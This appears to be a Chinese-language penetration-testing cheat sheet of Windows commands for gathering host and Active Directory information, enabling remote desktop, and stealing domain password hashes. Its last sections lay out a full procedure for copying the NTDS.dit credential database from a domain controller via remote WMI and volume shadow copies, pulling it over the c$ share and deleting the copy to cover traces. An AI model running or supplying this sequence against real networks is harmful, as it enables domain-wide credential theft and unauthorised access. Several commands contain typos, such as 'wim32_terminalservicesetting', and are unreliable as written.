### 收集本机信息

#### 查询当前权限

```
whoami
whoami /all
```

#### 查询网络配置信息

```
ipconfig /all
```

#### 查询操作系统及软件信息

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

#### 查看系统体系结构

```
echo %PROCESSOR_ARCHITECTURE%
```

#### 查看安装的软件及版本、路径等

```
wmic product get name,version
```

```powershell
powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name,version"
```

#### 查询本机服务信息

```
wmic service list brief
```

#### 查询进程列表

```
tasklist
wmic process list brief
```

#### 查看启动程序信息

```
wmic startup get command,caption
```

#### 查看计划任务

```
schtasks /query /fo LIST /v
```

#### 查看主机开机时间

```
net statistics workstation
```

#### 查询用户列表

```
net user  获取本机用户
net localgroup administrators 获取管理员用户
```

#### 查看当前在线用户

```
query user || qwinsta
```

#### 列出或断开本地计算机与所连接的客户端之间的对话

```
net session
```

#### 查询端口列表

```
netstat -ano
```

#### 查看补丁列表

```
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

#### 查询本机共享列表

```
net share
wmic share get name,path,status
```

#### 查询路由表及所有可用接口的ARP缓存表

```
route print
arp -a
```

#### 查看代理情况

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

#### 查看远程连接端口

```
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
```

#### Windows  Server 2003 开启3389端口

```
wmic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

#### Windows Server 2008 和 Windows Server 2012 开启3389端口

```
wmic /namespace:\\root\cimv2\terminalservices path wim32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1

wmic /namespace:\\root\cimv2\terminalservices path wim32_terminalservicesetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1

reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessioonPerUser /t REG_DWORD /d 0 /f
```

### 收集域内基础信息

#### 查询域

```
net view /domain
```

#### 查询域内用户组

```
net group /domain
```

#### 查询域成员计算机

```
net group "domain computers" /domain
```

#### 查询域用户组

```
net group "domain users" /domain
```

#### 查询域管理员组

```
net group "domain admins" /domain
```

#### 查询域控制器组

```
net group "domain controllers" /domain
netdom query pdc
```

#### 获取域信任信息

```
nltest /domain_trusts
```

#### 获取域密码策略等信息

```
net accounts /domain
```

#### 查看域控制器的机器名

```
nltest /DCLIST:域名
```

#### 查看域控制器的主机名

```
nslookup -type=SRV _ldap._tcp
```

#### 查看当前时间

```
net time /domain
```

#### 获取域内用户和管理员信息

```
net user /domain
```

#### 获取域内用户的详细信息

```
wmic useraccount get /all
```

#### 查看存在的用户

```
dsquery user
```

#### 查询本地管理员组用户

```
net localgroup administrators
```

### dump域内hash

#### 列出卷影拷贝信息

```
wmic /node:<ip> process call create "cmd.exe /c vssadmin list Shadows > c:\windows\temp\1.txt"
```

#### 创建卷影拷贝

```
wmic /node:<ip> process call create "cmd.exe /c vssadmin create shadow /for=C: > c:\windows\temp\1.txt"
```

#### 复制卷影拷贝的ntds.dit

```
wmic /node:<ip> process call create "cmd /c copy \\?\卷影副本卷名\Windows\NTDS\NTDS.dit C:\windows\temp
```

#### 复制到本地

```
copy \\ip\c$\windows\temp\ntds.dit .\
```

#### 删除

```
del \\ip\c$\windows\temp\ntds.dit
```

### 导出域镜像

```
adexplorer.exe /accepteula -snapshot "" ad.dat -noconnectprompt
```